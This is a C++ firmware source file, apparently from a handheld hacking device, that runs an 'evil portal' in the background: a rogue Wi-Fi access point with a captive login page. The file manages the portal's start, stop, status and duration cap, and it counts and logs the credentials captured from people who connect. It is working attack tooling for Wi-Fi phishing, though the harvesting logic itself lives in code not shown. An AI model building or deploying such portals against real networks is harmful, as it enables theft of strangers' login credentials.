#if !defined(LITE_VERSION)
#include "evil_portal_bg.h"
#include "core/radio_mem.h"
#include "core/wifi/ws_events.h"
#include "modules/wifi/evil_portal.h"
#include "modules/wifi/portal_cap.h"
#include <globals.h>
#include <new>

static EvilPortal *bgPortal = nullptr;
static uint32_t bgStartedMs = 0;
static uint32_t bgMaxMs = 0;
static int bgLastCredCount = 0;
static String bgSsid = "";
static uint8_t bgChannel = 0;

bool evilPortalBgRunning() { return bgPortal != nullptr; }

// Whether an armed BLE stack and the portal AP fit together is the open question
// this feature cannot answer by reasoning, so every reply carries the numbers.
static String heapReport() {
    return String("free_heap:") + String(ESP.getFreeHeap()) + " dma_block:" +
           String((unsigned)radioLargestDmaBlock());
}

// announceOnCli is false for the duration cap, which fires from the tick while the
// serial task may be mid-command. Writing to serialDevice there would land inside
// another reply and break its 0x04 EOT framing.
static void stopPortal(bool announceOnCli) {
    bgPortal->shutdown();
    delete bgPortal;
    bgPortal = nullptr;
    setDeviceState("idle");
    pushWsLog("portal stopped: " + bgSsid, "info");
    if (announceOnCli) serialDevice->println("portal '" + bgSsid + "' stopped. " + heapReport());
    bgSsid = "";
    bgChannel = 0;
    bgMaxMs = 0;
    bgLastCredCount = 0;
}

bool evilPortalBgStart(
    const String &ssid, uint8_t channel, const String &templateFile, uint32_t maxSeconds
) {
    if (bgPortal != nullptr) {
        serialDevice->println("ERROR: portal already running on '" + bgSsid + "'");
        return false;
    }

    // The gateway default is applied by the caller in attack_commands.cpp, which
    // runs ahead of both the blocking and the background path. Do not repeat it.

    EvilPortal *portal =
        new (std::nothrow) EvilPortal(ssid, channel, false, false, true, true, templateFile);
    if (portal == nullptr) {
        serialDevice->println("ERROR: out of memory starting portal. " + heapReport());
        return false;
    }
    if (!portal->isReady()) {
        delete portal;
        serialDevice->println("ERROR: portal setup failed, not on air. " + heapReport());
        return false;
    }

    bgPortal = portal;
    bgSsid = ssid;
    bgChannel = channel;
    bgStartedMs = millis();
    bgMaxMs = maxSeconds * 1000UL;
    bgLastCredCount = 0;

    setDeviceState("portal");
    pushWsLog("portal started: " + ssid + " ch" + String(channel), "info");
    serialDevice->println(
        "portal '" + ssid + "' ch" + String(channel) + " started, cap " +
        (maxSeconds ? String(maxSeconds) + "s" : String("unlimited")) + ". " + heapReport()
    );
    return true;
}

bool evilPortalBgStop() {
    if (bgPortal == nullptr) {
        serialDevice->println("no background portal running");
        return false;
    }
    stopPortal(true);
    return true;
}

String evilPortalBgStatus() {
    if (bgPortal == nullptr) return "portal: stopped";
    uint32_t now = millis();
    String out = "portal: running ssid:" + bgSsid + " ch:" + String(bgChannel) +
                 " uptime_s:" + String((now - bgStartedMs) / 1000) +
                 " creds:" + String(bgPortal->getCredentialCount());
    if (bgMaxMs == 0) out += " cap:unlimited";
    else out += " cap_remaining_s:" + String(portalCapRemainingMs(bgStartedMs, now, bgMaxMs) / 1000);
    return out + " " + heapReport();
}

void evilPortalBgTick() {
    if (bgPortal == nullptr) return;

    bgPortal->processRequests();

    int creds = bgPortal->getCredentialCount();
    if (creds > bgLastCredCount) {
        bgLastCredCount = creds;
        pushWsLog("portal captured credentials (" + String(creds) + " total)", "warn");
    }

    if (portalCapExpired(bgStartedMs, millis(), bgMaxMs)) {
        pushWsLog("portal duration cap reached: " + bgSsid, "info");
        stopPortal(false);
    }
}
#endif
